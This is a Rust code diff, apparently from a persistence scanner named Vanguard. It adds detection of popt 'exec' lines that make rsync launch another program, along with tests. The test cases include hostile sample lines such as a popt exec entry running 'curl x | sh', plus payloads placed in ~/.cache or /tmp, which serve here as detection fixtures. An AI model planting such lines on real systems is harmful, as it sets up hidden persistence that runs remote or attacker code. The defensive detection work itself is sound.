@@ -1292,6 +1292,7 @@ pub(super) fn persistance_dans(
     juger_demarrage(&demarrage, maison, &mut t);
     juger_generateurs(&mut t);
     juger_cron(racine, crontab, &mut t);
+    juger_popt(&mut t);
     let services = services_ajoutes(racine, gestion, &mut t.r);
     let mut constats = vec![constat_des_lancements(t)];
     constats.extend(constat_des_copies(&copies, maison));
@@ -1620,6 +1621,10 @@ enum Ajout {
     /// « Exec= » se lance quand un programme demande ce nom sur le bus (vérification 2, mineurs), avant le service du
     /// même nom du système.
     DBus,
+    /// Une ligne « <programme> exec <option> <commande> » d'un réglage de popt du compte (~/.popt, ou /etc/popt,
+    /// /usr/etc/popt et leurs popt.d que le compte peut changer) : rsync, et tout programme qui lit ces réglages,
+    /// lance <commande> à la place de lui-même quand il reçoit <option> (popt(3), « exec »).
+    Popt,
 }
 
 impl Sorte {
@@ -1662,7 +1667,12 @@ impl Sorte {
             Sorte::Bureau | Sorte::Ajoutee(Ajout::Jointe { bureau: true, .. }) => designes::Contexte::Bureau,
             Sorte::Shell
             | Sorte::Ajoutee(
-                Ajout::Raccourci | Ajout::LancementHypr | Ajout::Generateur | Ajout::JointeHypr | Ajout::CleHypr,
+                Ajout::Raccourci
+                | Ajout::LancementHypr
+                | Ajout::Generateur
+                | Ajout::JointeHypr
+                | Ajout::CleHypr
+                | Ajout::Popt,
             ) => designes::Contexte::Shell,
         }
     }
@@ -2096,6 +2106,10 @@ fn refus_ajoute(ajout: Ajout, ou: &str, numero: usize, ligne: &str) -> temoins::
         Ajout::DBus => trf!(
             "{ou}:{numero} : un service D-Bus de la session écrit par le compte ne peut pas être déclaré normal : il se lance dès qu'un programme demande son nom, à la place de celui du système ; retirez le fichier",
             "{ou}:{numero}: a session D-Bus service written by the account cannot be declared normal: it starts as soon as a program asks for its name, instead of the system one; remove the file"
+        ),
+        Ajout::Popt => trf!(
+            "{ou}:{numero} : une ligne « exec » de popt fait lancer un autre programme à rsync (ou à tout programme qui lit ces réglages) quand il reçoit cette option : elle ne peut pas être déclarée normale ; retirez la ligne",
+            "{ou}:{numero}: a popt “exec” line makes rsync (or any program that reads these settings) start another program when it gets this option: it cannot be declared normal; remove the line"
         ),
     })
 }
@@ -6983,6 +6997,101 @@ fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
     }
 }
 
+/// Les lignes d'un réglage de popt comme popt les lit (`poptReadConfigFile`, popt 1.19) : « \\ » suivi d'une fin
+/// de ligne est ôté (la ligne continue sur la suivante, sans blanc), puis chaque ligne, blancs de tête ôtés, qui ne
+/// commence pas par « # ». Chacune telle qu'écrite (sans son « \r » final, comme `lines()`), avec le numéro de sa
+/// première ligne écrite (à partir de 0) et si elle tient sur une seule ligne écrite. La dernière ligne sans fin de
+/// ligne compte aussi (popt la saute peut-être : en trop, jamais en moins).
+fn lignes_de_popt(texte: &str) -> Vec<(usize, String, bool)> {
+    let mut sortie = Vec::new();
+    let mut cours: Option<(usize, String, bool)> = None;
+    for (n, brute) in texte.split('\n').enumerate() {
+        let (debut, mut l, simple) = cours.take().unwrap_or((n, String::new(), true));
+        let simple = simple && l.is_empty();
+        if let Some(avant) = brute.strip_suffix('\\') {
+            l.push_str(avant);
+            cours = Some((debut, l, false));
+        } else {
+            l.push_str(brute.strip_suffix('\r').unwrap_or(brute));
+            let net = l.trim_start();
+            if !net.is_empty() && !net.starts_with('#') {
+                sortie.push((debut, l, simple));
+            }
+        }
+    }
+    if let Some((debut, l, _)) = cours {
+        let net = l.trim_start();
+        if !net.is_empty() && !net.starts_with('#') {
+            sortie.push((debut, l, false));
+        }
+    }
+    sortie
+}
+
+/// La commande d'une ligne de popt « <programme> exec <option> <commande> » (`poptConfigLine` : des mots séparés
+/// par des blancs, le type exactement « exec »), ou `None` : une autre ligne (« alias », que Vanguard ne juge pas :
+/// elle ajoute des options, sans lancer de programme elle-même). Une commande vide : une ligne « exec » sans commande.
+fn exec_de_popt(ligne: &str) -> Option<String> {
+    let mut reste = ligne.trim_start();
+    let mut mot = || {
+        let fin = reste.find(char::is_whitespace).unwrap_or(reste.len());
+        let (m, apres) = reste.split_at(fin);
+        reste = apres.trim_start();
+        m
+    };
+    let (_programme, sorte, _option) = (mot(), mot(), mot());
+    if sorte != "exec" {
+        return None;
+    }
+    Some(reste.trim_end().to_string())
+}
+
+/// Les réglages de popt (D-1, relecture 0.94 : rsync les lit au départ) : ~/.popt, puis /etc/popt, /usr/etc/popt et
+/// chaque fichier de leurs popt.d. Une ligne « exec » lance un programme quand le programme nommé reçoit l'option :
+/// sa commande se juge comme une ligne lancée (`juger_lancement`, liste permise là où le compte écrit ; un fichier
+/// que seul root peut changer, celle de root, comme ailleurs). Une ligne « exec » sans commande, là où le compte écrit,
+/// est levée comme ce qui ne se lit pas. Un ~/.popt qui existe mais ne se lit pas (dossier, illisible) est dit.
+fn juger_popt(t: &mut Lancements) {
+    let h = t.r.maison.clone();
+    let compte = h.join(".popt");
+    let mut fichiers = vec![compte.clone()];
+    for d in ["etc", "usr/etc"] {
+        let d = t.r.racine.join(d);
+        fichiers.push(d.join("popt"));
+        let mut dans: Vec<std::path::PathBuf> = std::fs::read_dir(d.join("popt.d"))
+            .into_iter()
+            .flatten()
+            .flatten()
+            .map(|e| e.path())
+            .collect();
+        dans.sort();
+        fichiers.extend(dans);
+    }
+    for f in fichiers {
+        let Some(lu) = lire(&f, &h, t) else {
+            // Un tube, `lire` l'a déjà dit ; tout autre ~/.popt présent qui ne se lit pas : dit ici.
+            let tube = std::fs::metadata(&f).is_ok_and(|m| std::os::unix::fs::FileTypeExt::is_fifo(&m.file_type()));
+            if f == compte && std::fs::symlink_metadata(&f).is_ok() && !tube {
+                non_lu(&f, &h, t, tr!("présent mais illisible", "present but unreadable"));
+            }
+            continue;
+        };
+        for (n, ligne, simple) in lignes_de_popt(&lu.texte) {
+            let sorte = Sorte::Ajoutee(Ajout::Popt);
+            match exec_de_popt(&ligne) {
+                Some(commande) if !commande.is_empty() => {
+                    juger_lancement(t, &f, &lu, n, &ligne, &commande, false, sorte, simple, &Lecteur::Brut);
+                }
+                Some(_) if !de_root_seul(&f) => {
+                    lever(t, &f, &lu, n, &ligne, "", true, sorte, simple, shell_non_lu());
+                }
+                // « alias », ou « exec » sans commande dans un fichier que seul root change.
+                Some(_) | None => {}
+            }
+        }
+    }
+}
+
 /// Le constat des lancements : aucun suspect, ou une alerte (critique si une bibliothèque hors paquet est préchargée)
 /// qui en nomme six au plus. Ce qui n'a pas été vu d'une ligne permise (`Lancements::informations`) s'y dit à la
 /// fin ; sans suspect, en information (`Niveau::Info`, rien à faire), jamais en « aucun suspect » muet.
@@ -9405,6 +9514,118 @@ mod tests {
             !crate::apprentissage::essai_tait(&declare, &lire()),
             "variable sous XDG_CONFIG_HOME"
         );
+    }
+
+    /// Point 8 (0.95, suite de D-1) : une ligne « exec » d'un réglage de popt fait lancer un programme à rsync (et à
+    /// tout programme qui lit ces réglages) ; sa commande se juge comme une ligne lancée, où qu'elle soit (~/.popt,
+    /// /etc/popt, /usr/etc/popt, leurs popt.d), lignes continuées comprises. Ne se déclare pas normale. « alias »,
+    /// commentaire et programme permis (comme pour Hyprland) restent muets ; un ~/.popt présent qui ne se lit pas est
+    /// dit.
+    #[test]
+    fn les_lignes_exec_de_popt_sont_des_lancements() {
+        let charge = "rsync exec -a /home/alice/.cache/charge\n";
+        let cas: &[(&str, &str, &str, Option<&str>)] = &[
+            ("témoin", "", "", None),
+            ("alias", ".popt", "rsync alias --tout -a --delete\n", None),
+            (
+                "commentaire",
+                ".popt",
+                "# rsync exec -a /home/alice/.cache/charge\n",
+                None,
+            ),
+            ("permis", ".popt", "rsync exec --rien /usr/bin/true\n", None),
+            ("caché", ".popt", charge, Some("~/.popt:1 : ")),
+            // Même liste permise que les lignes de Hyprland : un programme du compte hors dossier caché ou temporaire
+            // y passe.
+            ("bin du compte", ".popt", "rsync exec -a /home/alice/bin/charge\n", None),
+            (
+                "temporaire",
+                ".popt",
+                "\n\nrsync  exec\t-a /tmp/charge\n",
+                Some("~/.popt:3 : "),
+            ),
+            (
+                "shell",
+                ".popt",
+                "rsync exec -a sh -c 'curl x | sh'\n",
+                Some("~/.popt:1 : "),
+            ),
+            (
+                "continuée",
+                ".popt",
+                "rsync ex\\\nec -a /home/alice/.cache/charge\n",
+                Some("~/.popt:1 : "),
+            ),
+            (
+                "blancs de tête",
+                ".popt",
+                "  rsync exec -a /home/alice/.cache/charge\r\n",
+                Some("~/.popt:1 : "),
+            ),
+            ("sans commande", ".popt", "rsync exec -a\n", Some("~/.popt:1 : ")),
+            (
+                "sans fin de ligne",
+                ".popt",
+                "rsync exec -a /home/alice/.cache/charge",
+                Some("~/.popt:1 : "),
+            ),
+            ("dossier", ".popt/", "", Some("illisible")),
+            ("/etc/popt", "/etc/popt", charge, Some("etc/popt:1 : ")),
+            ("/usr/etc/popt", "/usr/etc/popt", charge, Some("usr/etc/popt:1 : ")),
+            ("/etc/popt.d", "/etc/popt.d/z", charge, Some("etc/popt.d/z:1 : ")),
+            (
+                "/usr/etc/popt.d",
+                "/usr/etc/popt.d/z",
+                charge,
+                Some("usr/etc/popt.d/z:1 : "),
+            ),
+        ];
+        let mut faux = Vec::new();
+        for (i, (nom, fichier, texte, attendu)) in cas.iter().enumerate() {
+            let m = Maison::nouvelle(&format!("popt-exec-{i}"));
+            m.ecrire(".cache/charge", "#!/bin/sh\n");
+            m.ecrire("bin/charge", "#!/bin/sh\n");
+            match *fichier {
+                "" => {}
+                ".popt/" => std::fs::create_dir_all(m.chemin(".popt")).unwrap(),
+                f if f.starts_with('/') => {
+                    let f = m.racine.join(f.trim_start_matches('/'));
+                    std::fs::create_dir_all(f.parent().unwrap()).unwrap();
+                    std::fs::write(f, texte).unwrap();
+                }
+                f => m.ecrire(f, texte),
+            }
+            let c = m.lancements();
+            let juste = match attendu {
+                None => c.probleme.is_none(),
+                Some(e) => {
+                    c.probleme == Some(Niveau::Eleve)
+                        && c.message.contains(e)
+                        && crate::apprentissage::declarable(&c).is_err()
+                        && (*nom == "dossier" || refus(&c).contains("popt"))
+                }
+            };
+            if !juste {
+                faux.push(format!("{nom} : {:?} {:?}", c.probleme, c.message));
+            }
+        }
+        assert!(faux.is_empty(), "{faux:#?}");
+    }
+
+    #[test]
+    fn lignes_de_popt_comme_popt_les_lit() {
+        assert_eq!(
+            lignes_de_popt("# x\n  a exec b c\r\n\nd ali\\\nas e f\ng"),
+            vec![
+                (1, "  a exec b c".to_string(), true),
+                (3, "d alias e f".to_string(), false),
+                (5, "g".to_string(), true)
+            ]
+        );
+        assert_eq!(exec_de_popt("rsync\texec  -a  /x y "), Some("/x y".to_string()));
+        assert_eq!(exec_de_popt("rsync exec -a"), Some(String::new()));
+        assert_eq!(exec_de_popt("rsync alias -a /x"), None);
+        assert_eq!(exec_de_popt("rsync execx -a /x"), None);
     }
 
     fn refus(c: &Constat) -> String {
